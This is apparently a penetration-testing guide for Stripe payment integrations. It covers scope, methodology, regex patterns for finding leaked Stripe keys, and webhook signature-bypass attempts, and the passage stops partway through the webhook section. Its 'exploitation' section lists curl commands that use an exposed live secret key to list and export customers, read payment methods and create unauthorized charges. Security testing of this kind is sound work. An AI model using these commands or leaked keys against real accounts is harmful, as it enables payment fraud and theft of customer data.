<stripe_security_guide>
<title>STRIPE SECURITY TESTING</title>

<critical>Stripe handles payment processing for millions of businesses. Security vulnerabilities in Stripe integrations can lead to financial fraud, unauthorized transactions, data theft, and compliance violations. Testing must cover API key exposure, webhook security, and payment flow integrity.</critical>

<scope>
- API key management (secret, publishable, restricted)
- Webhook signature verification
- Payment Intent and Setup Intent flows
- Idempotency key manipulation
- Price and quantity tampering
- Subscription management
- Connect platform security
- Customer and payment method data
</scope>

<methodology>
1. Identify Stripe integration points: API calls, webhooks, client-side code.
2. Test for API key exposure in client-side code, logs, and error messages.
3. Examine webhook endpoints for signature bypass vulnerabilities.
4. Test payment flows for price manipulation and race conditions.
5. Verify subscription and billing logic integrity.
</methodology>

<api_key_exposure>
<detection>
{% raw %}
# Stripe API key patterns
sk_live_[a-zA-Z0-9]{24,}     # Secret key (CRITICAL)
sk_test_[a-zA-Z0-9]{24,}     # Test secret key
pk_live_[a-zA-Z0-9]{24,}     # Publishable key (expected in client)
pk_test_[a-zA-Z0-9]{24,}     # Test publishable key
rk_live_[a-zA-Z0-9]{24,}     # Restricted key
rk_test_[a-zA-Z0-9]{24,}     # Test restricted key
whsec_[a-zA-Z0-9]{32,}       # Webhook signing secret

# Search locations
# - JavaScript source files
# - Mobile app binaries (APK, IPA)
# - Environment variable leaks
# - Error messages and stack traces
# - Git repository history
# - Configuration files
{% endraw %}
</detection>

<exploitation>
{% raw %}
# With exposed secret key:
# List all customers
curl https://api.stripe.com/v1/customers \
  -u sk_live_exposed_key:

# Create unauthorized charges
curl https://api.stripe.com/v1/charges \
  -u sk_live_exposed_key: \
  -d amount=10000 \
  -d currency=usd \
  -d source=tok_visa

# Access payment methods
curl https://api.stripe.com/v1/payment_methods \
  -u sk_live_exposed_key:

# Export customer data
curl https://api.stripe.com/v1/customers?limit=100 \
  -u sk_live_exposed_key:
{% endraw %}
</exploitation>
</api_key_exposure>

<webhook_attacks>
<signature_bypass>
{% raw %}
# Webhook signature header
Stripe-Signature: t=1234567890,v1=signature_hash

# Bypass attempts:

# 1. Missing signature handling
# Send request without Stripe-Signature header
# Check if webhook still processes

# 2. Empty/invalid signature
Stripe-Signature: 
Stripe-Signature: invalid
Stripe-Signature: t=0,v1=0

# 3. Timestamp tolerance bypass
# Use very old timestamp
Stripe-Signature: t=1,v1=calculated_with_old_timestamp

# 4. Signature confusion
# Send v0 signature if v1 is expected
Stripe-Signature: t=1234567890,v0=signature_hash
{% endraw %}
</signature_bypass>

